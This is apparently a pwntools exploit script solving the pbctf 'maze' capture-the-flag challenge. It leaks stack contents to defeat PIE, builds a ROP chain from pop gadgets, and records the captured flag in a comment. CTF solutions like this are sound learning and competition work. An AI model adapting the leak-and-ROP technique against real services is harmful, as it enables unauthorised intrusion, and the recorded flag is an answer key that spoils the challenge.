#!/usr/bin/env python3
from pwn import *


def connect():
    return remote('maze.chal.perfect.blue', 1)


def main():
    with connect() as tube:
        tube.recvuntil(b'Do you want color in the visualization? (Y/n) ')
        tube.sendline('n')
        tube.recvuntil('\n')
        stack = []
        for _ in range(10):
            line = tube.recvline().decode()
            stack.extend(struct.unpack('<II', bytes.fromhex(line[13:36])))
        pie = stack[16] - 0x1599
        assert pie & 0xfff == 0
        # asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
        tube.sendline(flat({
            0x30: b'flag',
            0x40: b''.join((
                struct.pack('<I', pie + 0x1396),
                #         00011396 5e              POP        ESI
                #         00011397 5f              POP        EDI
                #         00011398 5d              POP        EBP
                #         00011399 c3              RET
                struct.pack('<IIII', 0x1337, 0x31337, 0, pie + 0x13ad),
                #         000113ad 58              POP        EAX
                #         000113ae cc              INT        3
                struct.pack('<I', 1),
            )),
        }))
        tube.interactive()  # pbctf{hmm_s0mething_l00ks_off_w1th_th1s_s3tup}


if __name__ == '__main__':
    main()
